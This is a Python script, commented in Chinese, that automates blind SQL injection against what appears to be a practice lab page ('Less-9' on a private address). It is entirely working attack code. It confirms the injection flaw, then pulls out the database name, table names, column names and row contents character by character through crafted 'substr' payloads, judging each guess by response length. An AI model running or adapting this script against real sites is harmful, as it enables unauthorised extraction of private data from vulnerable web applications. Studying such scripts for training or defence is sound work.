import requests

base_url = "http://192.168.100.40:50267/Less-9/"
base_str = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
            'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
            'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',
            '8', '9', '_', '$', '@', '(', ')', '-', '.', '[', ']', '^',
            '{', '}', '~', '!']

# 检查是否存在SQL注入
payload_1 = "?id=1"
response_1 = len(requests.get(base_url + payload_1).text)

payload_2 = "?id=1'"
response_2 = len(requests.get(base_url + payload_2).text)

if response_2 != response_1:
    print(f"存在SQL注入！正常长度为: {response_1}, 错误长度为: {response_2}")

    # 获取数据库名称的长度
    dbname_len = 1
    while True:
        payload_3 = f"?id=1' and length(database())={dbname_len}--+"
        if len(requests.get(base_url + payload_3).text) == response_1:
            print(f"数据库名称长度为: {dbname_len}")
            break
        dbname_len += 1

    # 获取数据库名称
    dbname = ""
    for dbname_index in range(1, dbname_len + 1):
        for dbname_char in base_str:
            payload_4 = f"?id=1' and substr(database(),{dbname_index},1)='{dbname_char}'--+"
            if len(requests.get(base_url + payload_4).text) == response_1:
                dbname += dbname_char
                print(f"数据库的第{dbname_index}个字符: {dbname_char}")
                break
    print(f"完整数据库名称为: {dbname}")

    # 获取表的个数
    table_count = 1
    while True:
        payload_5 = f"?id=1' and (select count(*) from information_schema.tables where table_schema=database())={table_count}--+"
        if len(requests.get(base_url + payload_5).text) == response_1:
            print(f"数据库中表的个数为: {table_count}")
            break
        table_count += 1

    # 获取所有表名
    tables = []
    for table_index in range(1, table_count + 1):
        table_name = ""
        i = 1
        while True:
            for table_char in base_str:
                payload_6 = f"?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit {table_index - 1},1),{i},1)='{table_char}'--+"
                if len(requests.get(base_url + payload_6).text) == response_1:
                    table_name += table_char
                    print(f"表{table_index}的第{i}个字符: {table_char}")
                    break
            else:
                break
            i += 1
        print(f"表{table_index}的完整表名为: {table_name}")
        tables.append(table_name)

    # 获取所有表的字段
    for table_name in tables:
        # 获取字段个数
        column_count = 1
        while True:
            payload_7 = f"?id=1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='{table_name}')={column_count}--+"
            if len(requests.get(base_url + payload_7).text) == response_1:
                print(f"表 {table_name} 的字段个数为: {column_count}")
                break
            column_count += 1

        # 获取字段名
        columns = []
        for column_index in range(1, column_count + 1):
            column_name = ""
            i = 1
            while True:
                for column_char in base_str:
                    payload_8 = f"?id=1' and substr((select column_name from information_schema.columns where table_schema=database() and table_name='{table_name}' limit {column_index - 1},1),{i},1)='{column_char}'--+"
                    if len(requests.get(base_url + payload_8).text) == response_1:
                        column_name += column_char
                        print(f"表 {table_name} 第 {column_index} 个字段的第 {i} 个字符: {column_char}")
                        break
                else:
                    break
                i += 1
            print(f"表 {table_name} 的字段 {column_index} 的完整字段名为: {column_name}")
            columns.append(column_name)

        # 获取数据
        for row_index in range(0, 10):  # 假设最多10行
            # 检查行是否存在
            payload_row_count = f"?id=1' and if((select count(*) from {table_name})>{row_index}, 1, 0)--+"
            if len(requests.get(base_url + payload_row_count).text) == response_1:
                print(f"-------> 正在获取表 {table_name} 第 {row_index + 1} 行数据 <-------")
                row_data = {}

                for column in columns:
                    value = ""
                    char_index = 1
                    while True:
                        for char in base_str:
                            payload_value = f"?id=1' and if(substr((select {column} from {table_name} limit {row_index},1),{char_index},1)='{char}', 1, 0)--+"
                            if len(requests.get(base_url + payload_value).text) == response_1:
                                value += char
                                print(f"{column} 的第 {char_index} 个字符为: {char}")
                                break
                        else:
                            # 如果没有匹配字符，说明到达字符串末尾
                            break
                        char_index += 1

                    row_data[column] = value
                print(f"-------> 表 {table_name} 第 {row_index + 1} 行数据: {row_data} <-------")
            else:
                print(f"表 {table_name} 中没有更多数据，结束在第 {row_index + 1} 行")
                break
else:
    print("不存在SQL注入或payload不正确！")


